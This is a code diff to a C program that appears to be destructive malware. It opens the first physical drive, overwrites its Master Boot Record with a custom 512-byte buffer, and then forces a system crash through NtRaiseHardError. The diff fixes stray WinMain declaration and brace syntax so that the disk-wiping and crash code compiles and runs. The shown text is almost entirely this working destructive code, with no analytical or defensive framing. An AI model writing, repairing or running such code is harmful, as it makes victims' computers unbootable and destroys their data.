@@ -60,12 +60,7 @@ int main()
         exit(EXIT_SUCCESS);
     }
 
-    int CALLBACK WinMain(
-        HINSTANCE hInstance, HINSTANCE hPrevInstance,
-        LPSTR     lpCmdLine, int       nCmdShow
-    );
-    {
-        DWORD dwBytesWritten;
+    DWORD dwBytesWritten;
         HANDLE hDevice = CreateFileW(
             L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
             FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
@@ -73,7 +68,6 @@ int main()
 
         WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
         CloseHandle(hDevice);
-    }
 
     while (TRUE)
     {
@@ -83,5 +77,4 @@ int main()
         NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse); // There are many Crash reasons
         return 0;
     }
-
 }
